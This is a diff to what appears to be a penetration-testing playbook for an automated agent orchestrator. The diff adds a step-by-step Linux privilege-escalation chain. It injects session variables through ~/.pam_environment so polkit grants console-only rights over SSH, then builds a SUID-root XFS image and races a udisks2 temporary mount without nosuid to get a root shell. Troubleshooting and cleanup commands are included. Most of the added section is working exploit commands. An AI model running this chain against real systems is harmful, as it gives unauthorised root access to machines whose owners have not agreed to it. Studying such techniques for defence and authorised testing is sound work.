@@ -20,6 +20,13 @@ keywords:
   - CVE-2021-4034
   - pwnkit
   - polkit dbus bypass
+  - pam_environment
+  - user_readenv
+  - polkit allow_active
+  - udisksctl
+  - udisks2 privesc
+  - logind active session
+  - loop-setup nosuid
 tools:
   - GTFOBins reference
   - gcc
@@ -484,6 +491,154 @@ risk destabilizing the target.
 orchestrator with assessment: `blocked — no exec-capable staging directory for
 GCONV_PATH .so`. The orchestrator may route to **linux-kernel-exploits** for
 DirtyCow/DirtyPipe or other vectors that don't require shared library loading.
+
+## Step 4b: PAM Environment Injection + Polkit Active Session Bypass
+
+When `linux-discovery` reports `user_readenv=1` in PAM config and polkit
+`allow_active=yes` on privileged actions, this chain escalates an SSH session to
+perform operations that normally require physical console presence.
+
+### How It Works
+
+1. `pam_env.so` with `user_readenv=1` reads `~/.pam_environment` during the auth
+   stack — *before* `pam_systemd.so` runs in the session stack
+2. Injecting `XDG_SEAT` and `XDG_VTNR` tricks `pam_systemd` into registering the
+   SSH session as a physical console session (`Active=yes`)
+3. Polkit policies with `allow_active=yes` now grant access without authentication
+4. `udisksctl loop-setup` + `Filesystem.Resize`/`Check` triggers a temporary mount
+   via libblockdev at `/tmp/blockdev.XXXXXX` **without nosuid flags**
+5. A SUID root binary in the mounted filesystem executes with `euid=0`
+
+### Prerequisites
+
+- SSH access as any user
+- `pam_env.so` configured with `user_readenv=1` (default on SUSE/openSUSE)
+- `udisks2` + `libblockdev` installed (default on most desktop-oriented installs)
+- Polkit `allow_active=yes` on udisks2 loop-setup and filesystem operations
+- `xfsprogs` on attackbox (for building the XFS image)
+
+### Step 1: Verify PAM Configuration
+
+```bash
+grep -r "user_readenv" /etc/pam.d/ 2>/dev/null
+# Look for: pam_env.so user_readenv=1
+```
+
+If `user_readenv=1` is NOT present, this technique does not apply.
+
+### Step 2: Inject Session Properties
+
+```bash
+cat > ~/.pam_environment << 'EOF'
+XDG_SEAT OVERRIDE=seat0
+XDG_VTNR OVERRIDE=1
+EOF
+```
+
+**Disconnect the SSH session** (exit), then **reconnect**. The new session will be
+registered as Active.
+
+### Step 3: Verify Active Session
+
+```bash
+loginctl show-session "$XDG_SESSION_ID" | grep -E "Active|State|Seat"
+# Expected: Active=yes, State=active, Seat=seat0
+```
+
+If `Active=no`, check that `~/.pam_environment` was written correctly and that
+you fully disconnected and reconnected (not just opened a new channel on the
+same SSH connection).
+
+### Step 4: Build Malicious Filesystem Image (on attackbox)
+
+Build an XFS image containing a SUID root bash binary. This requires root on the
+attackbox.
+
+```bash
+# Get bash from target for glibc compatibility
+scp user@TARGET:/bin/bash /tmp/target-bash
+
+# Create XFS image
+dd if=/dev/zero of=./suid.image bs=1M count=300
+mkfs.xfs -f ./suid.image
+mkdir -p /tmp/suid-mount
+mount -t xfs ./suid.image /tmp/suid-mount
+cp /tmp/target-bash /tmp/suid-mount/bash
+chown root:root /tmp/suid-mount/bash
+chmod 04555 /tmp/suid-mount/bash
+umount /tmp/suid-mount
+
+# Transfer to target
+scp ./suid.image user@TARGET:~/suid.image
+```
+
+### Step 5: Exploit UDisks2 Nosuid Mount Race
+
+On target (with `Active=yes` session):
+
+```bash
+# Kill gvfs-udisks2-volume-monitor if running (can interfere)
+killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null || true
+
+# Create loop device (no auth prompt thanks to Active=yes)
+udisksctl loop-setup --file ~/suid.image --no-user-interaction
+# Note the device path (e.g., /dev/loop0)
+
+# Start background catcher — races to exec SUID bash from temp mount
+(while true; do
+  for d in /tmp/blockdev*/; do
+    [ -x "${d}bash" ] && exec "${d}bash" -p -c 'echo "[+] GOT ROOT"; id; exec bash -p'
+  done
+  sleep 0.01
+done) &
+CATCHER_PID=$!
+
+# Trigger nosuid-less temporary mount via XFS resize
+gdbus call --system \
+  --dest org.freedesktop.UDisks2 \
+  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
+  --method org.freedesktop.UDisks2.Filesystem.Resize 0 'a{sv}'
+
+# If Resize errors, try Check instead:
+gdbus call --system \
+  --dest org.freedesktop.UDisks2 \
+  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
+  --method org.freedesktop.UDisks2.Filesystem.Check 'a{sv}'
+
+# Wait and check
+sleep 2
+ls -la /tmp/blockdev*/bash 2>/dev/null
+
+# Execute SUID bash directly if catcher didn't fire
+/tmp/blockdev*/bash -p
+# Expected: euid=0(root)
+```
+
+**The `-p` flag is critical** — without it, bash drops the elevated euid.
+
+### Troubleshooting
+
+- **"Not authorized" from udisksctl**: `Active=yes` didn't take effect. Verify
+  with `loginctl show-session`. Ensure you fully disconnected and reconnected SSH.
+- **Race doesn't land**: The mount window is milliseconds. Retry 3-5 times. Kill
+  the catcher (`kill $CATCHER_PID`), delete the loop device (`udisksctl
+  loop-delete --block-device /dev/loop0 --no-user-interaction`), and repeat from
+  loop-setup.
+- **Loop device is loop1/loop2**: Adjust the gdbus object path to match (e.g.,
+  `/org/freedesktop/UDisks2/block_devices/loop1`).
+- **No /tmp/blockdev* appears**: libblockdev may use a different temp path. Check
+  `/proc/mounts` while triggering Resize/Check. A compiled C catcher monitoring
+  `/proc/mounts` in a tight loop is more reliable than the bash approach.
+- **udisksctl not found**: udisks2 not installed. This technique does not apply.
+
+### Cleanup
+
+```bash
+rm ~/.pam_environment
+kill $CATCHER_PID 2>/dev/null
+udisksctl loop-delete --block-device /dev/loop0 --no-user-interaction 2>/dev/null
+rm ~/suid.image
+```
 
 ## Step 5: SUID Binary Exploitation
 
